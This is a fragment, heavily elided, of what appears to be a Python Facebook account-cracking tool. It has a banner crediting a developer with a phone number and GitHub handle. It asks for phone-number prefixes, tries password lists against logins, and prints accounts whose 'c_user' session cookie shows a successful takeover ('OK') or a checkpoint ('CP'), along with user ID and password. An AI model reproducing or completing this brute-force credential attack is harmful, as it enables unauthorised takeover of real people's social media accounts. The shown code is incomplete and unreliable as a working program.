...
\033[1;93m______________________________________________________
 ...
 \033[1;93m(*)\033[1;92m Developer : Zihad islam
 \033[1;93m(*)\033[1;92m WhatsApp  : +8801875525411
 \033[1;93m(*)\033[1;92m Version   : 2.0
 \033[1;93m(*)\033[1;92m Github    : CYBER-31
\033[1;93m______________________________________________________
"""    
loop = 0
oks = []
...
def random_number():
	...
	print('\033[1;33mCode example: 88018,88017,88016,00185,88014,88019 ...\033[0;97m')
	kode = input('Put code: ')
	...
	try:
		for ps in pwx:
			...
			if 'c_user' in log_cookies:
				...
				cid = coki[7:22]
				print('     \033[1;32m[CYBER-70-OK] '+cid+' | '+ps+'\033[0;97m')
				...
				coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
				cid = coki[24:39]
				print('     \033[1;33m[zCYBER-70-CP] '+cid+' | '+ps+'\033[0;97m')
